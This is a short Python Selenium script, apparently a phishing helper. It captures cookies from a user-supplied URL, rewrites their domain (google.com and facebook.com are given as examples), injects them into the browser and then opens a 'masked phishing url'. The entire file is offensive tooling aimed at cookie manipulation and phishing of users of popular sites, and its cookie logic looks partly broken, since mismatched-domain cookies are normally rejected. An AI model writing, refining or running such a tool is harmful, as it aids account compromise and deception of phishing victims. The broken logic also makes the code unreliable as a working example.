from selenium import webdriver
import pickle
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager


def clearPKL():
    # Create an empty variable
    empty_list = []
    # Open the pickle file in 'wb' so that you can write and dump the empty variable
    openfile = open('cookies.pkl', 'wb')
    pickle.dump(empty_list, openfile)
    openfile.close()


if __name__ == '__main__':
    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()))

    target_url = input("\nEnter url to capture it's cookies : ")
    domain_name = input("\nEnter domain name for above url, ex: .google.com or .facebook.com : ")
    phishing_url = input("\nEnter your masked phishing url : ")

    driver.get(target_url)
    pickle.dump(driver.get_cookies(), open("cookies.pkl", "wb"))
    cookies = pickle.load(open("cookies.pkl", "rb"))

    for cookie in cookies:
        cookie['domain'] = domain_name

        try:
            driver.add_cookie(cookie)
        except Exception as e:
            print(e)

    driver.get(phishing_url)
    print("\nurl with cookie : " + driver.current_url)
    driver.close()
    clearPKL()
